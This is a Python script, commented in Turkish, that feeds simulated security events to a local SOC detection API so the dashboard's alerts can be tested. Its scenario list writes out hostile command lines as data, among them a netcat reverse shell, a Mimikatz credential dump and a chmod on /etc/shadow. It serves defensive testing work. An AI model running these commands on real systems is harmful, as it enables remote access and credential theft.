import requests
import time
import random
import json

# Hedef API
API_URL = "http://localhost:8000/api/event"

# Sahte Senaryolar
SCENARIOS = [
    {
        "type": "process_creation",
        "hostname": "FINANCE-PC-01",
        "user": "jdoe",
        "command_line": "powershell.exe -enc AABBCC==", 
        "desc": "Encoded PowerShell (Suspicious)"
    },
    {
        "type": "network_connection",
        "hostname": "HR-LAPTOP-04",
        "user": "system",
        "destination_port": 4444,
        "command_line": "nc.exe 192.168.1.5 4444 -e cmd.exe",
        "desc": "Reverse Shell Attempt"
    },
    {
        "type": "process_creation",
        "hostname": "SERVER-DB-01",
        "user": "admin",
        "command_line": "mimikatz.exe sekurlsa::logonpasswords",
        "desc": "Credential Dumping (Mimikatz)"
    },
    {
        "type": "file_modification",
        "hostname": "CEO-MACBOOK",
        "user": "root",
        "command_line": "chmod 777 /etc/shadow",
        "desc": "Privilege Escalation Attempt"
    }
]

def generate_traffic():
    print("🚀 SOC Trafik Simülasyonu Başlatıldı...")
    print("Dashboard'u izleyin: http://localhost:3000/soc")
    
    while True:
        # Rastgele bir senaryo seç
        scenario = random.choice(SCENARIOS)
        
        # Event verisini hazırla
        event = {
            "type": scenario["type"],
            "hostname": scenario["hostname"],
            "user": scenario["user"],
            "command_line": scenario["command_line"]
        }
        
        try:
            # API'ye gönder
            response = requests.post(API_URL, json=event)
            
            if response.status_code == 200:
                res_json = response.json()
                if res_json.get("status") == "alert_generated":
                    print(f"🚨 [ALERT] {scenario['desc']} -> Tespit Edildi!")
                else:
                    print(f"✅ [INFO] Normal aktivite gönderildi: {scenario['hostname']}")
            else:
                print(f"❌ Hata: {response.status_code}")
                
        except Exception as e:
            print(f"⚠️ Bağlantı Hatası (Backend çalışıyor mu?): {e}")
            
        # 1-3 saniye bekle (Gerçekçi olsun)
        time.sleep(random.uniform(1, 3))

if __name__ == "__main__":
    generate_traffic()